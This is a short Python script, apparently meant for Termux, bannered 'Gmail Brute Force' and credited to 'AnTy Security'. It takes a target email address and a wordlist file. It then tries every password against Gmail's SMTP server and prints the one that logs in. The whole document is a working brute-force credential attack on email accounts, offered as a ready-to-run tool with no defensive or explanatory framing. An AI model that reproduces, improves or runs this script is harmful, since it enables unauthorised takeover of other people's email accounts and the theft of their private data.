#code command import 
import smtplib
import os,sys,time
#code
os.system("clear")
os.system ("termux-setup-storage")
os.system ("figlet Gmail Brute Force")
print "      " 
print "                      Author : AnTy Security"
print
smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserver.ehlo()
smtpserver.starttls()
print
user = raw_input("Enter Email : ")
passF = raw_input("Enter Wordlist File : ")
passF = open(passF, "r")

for password in passF:

        try:

                smtpserver.login(user, password)
                print ("Password : %s" % password)
                break;

        except smtplib.SMTPAuthenticationError:
                print("\033[1;91mPassword not found <>Try to find Please wait \033")
